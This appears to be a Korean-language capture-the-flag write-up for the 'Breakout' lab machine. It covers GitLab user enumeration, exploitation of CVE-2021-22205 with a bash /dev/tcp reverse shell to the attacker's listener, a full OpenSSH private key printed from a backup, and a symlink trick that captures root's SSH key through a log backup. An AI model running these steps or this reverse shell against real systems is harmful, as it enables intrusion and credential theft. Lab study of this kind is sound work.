---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/exec/ssh-key
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.243.182
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2021-22205]
status: solved
tech_count: 2
---
### Nmap
```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ nnmap 192.168.243.182
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 13:05 +0900
Nmap scan report for 192.168.243.182
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/
|_/*/new /*/edit /*/raw
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://192.168.243.182/users/sign_in
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   83.96 ms 192.168.45.1
2   83.79 ms 192.168.45.254
3   84.03 ms 192.168.251.1
4   84.31 ms 192.168.243.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.05 seconds
```

https://gitlab.com/gitlab-org/gitlab-foss/-/work_items/40158
api를 통해 유저 확인 가능
http://192.168.243.182/api/v4/users/1

```js
{
  "id": 1,
  "name": "Administrator",
  "username": "root",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/4924e448526fb188fd8e0c75d0dbb3bf?s=80&d=identicon",
  "web_url": "http://breakout/root",
  "created_at": "2022-03-03T18:32:40.659Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 2,
  "name": "webmaster",
  "username": "webmaster",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/92279a35ff837beb3ecc6ba7eeafb74e?s=80&d=identicon",
  "web_url": "http://breakout/webmaster",
  "created_at": "2022-03-03T18:35:07.902Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 3,
  "name": "michelle",
  "username": "michelle",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/fcf53cd37c1f86e2b43f1db402f41f52?s=80&d=identicon",
  "web_url": "http://breakout/michelle",
  "created_at": "2022-03-03T18:35:08.484Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 4,
  "name": "Coaran",
  "username": "coaran",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/4d92c43788f35237750720daeeb6297a?s=80&d=identicon",
  "web_url": "http://breakout/coaran",
  "created_at": "2022-03-03T18:35:08.705Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

```

웹페이지 접근 시 버전 확인 가능
![[Pasted image 20260818141807.png]]

웹에서 PoC 검색
https://github.com/inspiringz/CVE-2021-22205

```bash
┌──(kali㉿kali)-[~/PG/Breakout/CVE-2021-22205]
└─$ python CVE-2021-22205.py -u http://192.168.243.182 -m rev 192.168.45.207 4444
===> Reverse Shell Mode

[*] command: bash -i >& /dev/tcp/192.168.45.207/4444 0>&1
[!] Error: request timeout(10)
```

리버스쉘 연결 및 flag확인
```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.182] 54756
bash: cannot set terminal process group (320): Inappropriate ioctl for device
bash: no job control in this shell
git@breakout:~/gitlab-workhorse$ whoami
whoami
git
git@breakout:~/gitlab-workhorse$
```



backups 내부에서 key 획득
```bash
git@breakout:~/backups$ cat mykey
cat mykey
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

gitlab api를 통해 획득한 유저 `coaran` 으로 ssh 접근
```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ chmod 600 key

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ ssh -i key coaran@192.168.243.182
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Aug 2026 05:48:57 AM UTC

  System load:  0.05              Processes:                318
  Usage of /:   89.8% of 9.78GB   Users logged in:          0
  Memory usage: 81%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   4%                IPv4 address for ens160:  192.168.243.182

  => / is using 89.8% of 9.78GB


39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


*** System restart required ***

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

coaran@breakout:~$ cat local.txt
75c6c158473b5125a2662cc9fdaa4ba6
```

docker mount 확인
```bash
git@breakout:~/backups$ mount | grep gitlab
mount | grep gitlab
/dev/sda2 on /etc/gitlab type ext4 (rw,relatime)
/dev/sda2 on /var/log/gitlab type ext4 (rw,relatime)
/dev/sda2 on /var/opt/gitlab type ext4 (rw,relatime)
```

root key 심볼릭링크 생성
```bash
git@breakout:/var/log/gitlab/gitaly$ ln -s /root/.ssh/id_rsa keykey
ln -s /root/.ssh/id_rsa keykey
git@breakout:/var/log/gitlab/gitaly$ ls -al
ls -al
total 244
drwx------  2 git  root   4096 Aug 18 05:55 .
drwxr-xr-x 20 root root   4096 Mar  3  2022 ..
-rw-r--r--  1 root root  35381 Mar  3  2022 @4000000062225c4419243204.u
-rw-r--r--  1 root root   6348 Mar  4  2022 @400000006a83e2bc1d93f3ec.u
lrwxrwxrwx  1 root root     32 Mar  3  2022 config -> /opt/gitlab/sv/gitaly/log/config
-rw-r--r--  1 root root   6215 Aug 18 05:42 current
-rw-r--r--  1 git  git       0 Mar  3  2022 gitaly_hooks.log
-rw-r--r--  1 git  git  173449 Aug 18 06:16 gitaly_ruby_json.log
-rw-r--r--  1 git  git    7695 Aug 18 04:52 gitaly_ruby_json.log.1.gz
lrwxrwxrwx  1 git  git      17 Aug 18 05:55 keykey -> /root/.ssh/id_rsa
-rw-------  1 root root      0 Mar  3  2022 lock
```


그 후 압축 해제제
```bash
coaran@breakout:/opt/backups$ unzip log_backup.zip -d /tmp/
Archive:  log_backup.zip
   creating: /tmp/srv/gitlab/logs/gitaly/
  inflating: /tmp/srv/gitlab/logs/gitaly/gitaly_ruby_json.log
  inflating: /tmp/srv/gitlab/logs/gitaly/current
 extracting: /tmp/srv/gitlab/logs/gitaly/lock
   creating: /tmp/srv/gitlab/logs/gitlab-rails/
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/gitlab-rails-db-migrate-2022-03-03-18-31-56.log
   creating: /tmp/srv/gitlab/logs/gitlab-shell/
   creating: /tmp/srv/gitlab/logs/postgresql/
  inflating: /tmp/srv/gitlab/logs/postgresql/current
 extracting: /tmp/srv/gitlab/logs/postgresql/lock
   creating: /tmp/srv/gitlab/logs/reconfigure/
  inflating: /tmp/srv/gitlab/logs/reconfigure/1646332280.log
   creating: /tmp/srv/gitlab/logs/redis/
  inflating: /tmp/srv/gitlab/logs/redis/current
 extracting: /tmp/srv/gitlab/logs/redis/lock
   creating: /tmp/srv/gitlab/logs/sshd/
  inflating: /tmp/srv/gitlab/logs/sshd/current
 extracting: /tmp/srv/gitlab/logs/sshd/lock
 extracting: /tmp/srv/gitlab/logs/gitaly/gitaly_hooks.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/application_json.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/auth.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/application.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/grpc.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/service_measurement.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/production_json.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/sidekiq_client.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/production.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/exceptions_json.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/api_json.log
   creating: /tmp/srv/gitlab/logs/alertmanager/
   creating: /tmp/srv/gitlab/logs/gitlab-exporter/
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/current
 extracting: /tmp/srv/gitlab/logs/gitlab-exporter/lock
   creating: /tmp/srv/gitlab/logs/gitlab-workhorse/
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/current
 extracting: /tmp/srv/gitlab/logs/gitlab-workhorse/lock
   creating: /tmp/srv/gitlab/logs/logrotate/
 extracting: /tmp/srv/gitlab/logs/logrotate/current
 extracting: /tmp/srv/gitlab/logs/logrotate/lock
   creating: /tmp/srv/gitlab/logs/nginx/
 extracting: /tmp/srv/gitlab/logs/nginx/current
 extracting: /tmp/srv/gitlab/logs/nginx/gitlab_error.log
 extracting: /tmp/srv/gitlab/logs/nginx/error.log
 extracting: /tmp/srv/gitlab/logs/nginx/lock
 extracting: /tmp/srv/gitlab/logs/nginx/access.log
  inflating: /tmp/srv/gitlab/logs/nginx/gitlab_access.log
   creating: /tmp/srv/gitlab/logs/prometheus/
  inflating: /tmp/srv/gitlab/logs/prometheus/current
 extracting: /tmp/srv/gitlab/logs/prometheus/lock
   creating: /tmp/srv/gitlab/logs/puma/
  inflating: /tmp/srv/gitlab/logs/puma/current
 extracting: /tmp/srv/gitlab/logs/puma/lock
   creating: /tmp/srv/gitlab/logs/redis-exporter/
  inflating: /tmp/srv/gitlab/logs/redis-exporter/current
 extracting: /tmp/srv/gitlab/logs/redis-exporter/lock
   creating: /tmp/srv/gitlab/logs/sidekiq/
  inflating: /tmp/srv/gitlab/logs/sidekiq/current
 extracting: /tmp/srv/gitlab/logs/sidekiq/lock
  inflating: /tmp/srv/gitlab/logs/alertmanager/current
 extracting: /tmp/srv/gitlab/logs/alertmanager/lock
   creating: /tmp/srv/gitlab/logs/grafana/
   creating: /tmp/srv/gitlab/logs/postgres-exporter/
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/current
 extracting: /tmp/srv/gitlab/logs/postgres-exporter/lock
 extracting: /tmp/srv/gitlab/logs/puma/puma_stderr.log
  inflating: /tmp/srv/gitlab/logs/puma/puma_stdout.log
  inflating: /tmp/srv/gitlab/logs/grafana/current
 extracting: /tmp/srv/gitlab/logs/grafana/lock
  inflating: /tmp/srv/gitlab/logs/alertmanager/@4000000062225c44189a7064.u
  inflating: /tmp/srv/gitlab/logs/gitaly/@4000000062225c4419243204.u
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/@4000000062225c441a099894.u
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/@4000000062225c441970236c.u
  inflating: /tmp/srv/gitlab/logs/grafana/@4000000062225c441a0d6d0c.u
 extracting: /tmp/srv/gitlab/logs/logrotate/@4000000062225c4419cc1a64.u
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/@4000000062225c4419aeca7c.u
  inflating: /tmp/srv/gitlab/logs/postgresql/@4000000062225c4419ea6c1c.u
  inflating: /tmp/srv/gitlab/logs/prometheus/@4000000062225c441a87c944.u
  inflating: /tmp/srv/gitlab/logs/puma/@4000000062225c441a5cc974.u
  inflating: /tmp/srv/gitlab/logs/reconfigure/1646418990.log
  inflating: /tmp/srv/gitlab/logs/redis/@4000000062225c441a19b1ac.u
  inflating: /tmp/srv/gitlab/logs/redis-exporter/@4000000062225c441abc6dd4.u
  inflating: /tmp/srv/gitlab/logs/sidekiq/@4000000062225c441a6531cc.u
  inflating: /tmp/srv/gitlab/logs/sshd/@4000000062225c341459482c.u
  inflating: /tmp/srv/gitlab/logs/alertmanager/@400000006a83e2bc1f2fd554.u
  inflating: /tmp/srv/gitlab/logs/gitaly/@400000006a83e2bc1d93f3ec.u
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/@400000006a83e2bc1c9cda1c.u
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/@400000006a83e2bc1c96e6ac.u
  inflating: /tmp/srv/gitlab/logs/grafana/@400000006a83e2bc1c6a8364.u
 extracting: /tmp/srv/gitlab/logs/logrotate/@400000006a83e2bc1cf283cc.u
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/@400000006a83e2bc1c6101cc.u
  inflating: /tmp/srv/gitlab/logs/postgresql/@400000006a83e2bc1d304464.u
  inflating: /tmp/srv/gitlab/logs/prometheus/@400000006a83e2bc1ca51f4c.u
  inflating: /tmp/srv/gitlab/logs/puma/@400000006a83e2bc1d9cdd2c.u
  inflating: /tmp/srv/gitlab/logs/reconfigure/1722646642.log
  inflating: /tmp/srv/gitlab/logs/redis/@400000006a83e2bc1c58b4cc.u
  inflating: /tmp/srv/gitlab/logs/redis-exporter/@400000006a83e2bc1bcf06b4.u
  inflating: /tmp/srv/gitlab/logs/sidekiq/@400000006a83e2bc1ca0aaac.u
  inflating: /tmp/srv/gitlab/logs/sshd/@4000000066ad807a2881f8e4.u
  inflating: /tmp/srv/gitlab/logs/gitaly/gitaly_ruby_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/sidekiq_client.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/api_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/production_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/application_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/gitlab-rails-db-migrate-2022-03-03-18-31-56.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/exceptions_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/service_measurement.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/grpc.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/production.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/auth.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/application.log.1.gz
  inflating: /tmp/srv/gitlab/logs/nginx/gitlab_access.log.1.gz
 extracting: /tmp/srv/gitlab/logs/puma/puma_stdout.log.1.gz
 extracting: /tmp/srv/gitlab/logs/puma/puma_stderr.log.1.gz
  inflating: /tmp/srv/gitlab/logs/gitaly/keykey
```

획득한 키로 root 접속 후 flag 확인
```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ vi rootkey

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ chmod 600 rootkey

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ ssh -i rootkey root@192.168.243.182
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Aug 2026 06:20:03 AM UTC

  System load:  0.01              Processes:                328
  Usage of /:   91.2% of 9.78GB   Users logged in:          1
  Memory usage: 81%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   5%                IPv4 address for ens160:  192.168.243.182

  => / is using 91.2% of 9.78GB


39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Fri Mar  4 18:36:31 2022
root@breakout:~# ls
build.sh  data.zip  docker-compose.yml  healthy.sh  proof.txt  snap
root@breakout:~# cat proof.txt
84a74dc9ac82971bfdb19df921c85322
```

